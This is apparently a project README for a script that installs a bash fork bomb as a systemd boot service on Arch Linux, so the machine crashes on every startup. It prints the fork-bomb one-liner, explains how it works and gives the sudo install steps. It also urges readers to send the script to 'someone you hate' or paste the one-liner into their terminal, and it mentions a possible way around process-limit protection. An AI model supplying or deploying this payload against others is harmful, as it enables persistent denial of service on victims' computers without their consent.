# Fork-bomb-on-boot-for-Arch

THIS IS A W.I.P


Please do not run this in anything besides a Virtual machine or someone you hates computer

If you run this, you computer WILL crash on boot also it's only for linux. If you have someone you hate in particular, send them the script. 

This works because :() creates a function called :, since bash allows semicolons as function names. then, {} contains what the semicolons function actually does. then, inside that, is :|: & , which means that the semicolon is piped into another semicolon, which duplicates the process. & turns it into a backround process, making parent child stuff faster, making the duplicating faster. Then, ;: seperates the rest of the command from the semicolon, and runs it. Then, the processes will duplicate and increase exponentially. it will turn from 1, to 2, to 4, to 8, to 16 etc. It's like the penny that doubles in value every day, except it doubles in value as fast as your CPU and RAM can handle.


Notes: 
- Will not work if the OS has fork bomb protection. This caps the amount of procceses allowed to be created
- Might work on some other OS's beside Arch, idk tho. If u want the same thing but it crashes the PC once, and doesnt start on boot, just paste :(){ :|: & };: into their terminal
- Do NOT run this outside a Virtual Machine because it's not gonna be fun
- Also, in the future, I might make it so that it disables fork bomb protection by raising the proccess limit cap, probably not tho I'm too lazy
- I mighty get banned for this idk 


## Running it

Before you can run the script, you need to make it executable — Linux won't run it otherwise:

```bash
chmod +x on-boot.sh
```

Then to install it as a boot service:

```bash
sudo bash on-boot.sh --install
```

Note that `sudo` is required since the script interacts with systemd. Once installed, it will run automatically every time your system starts up.
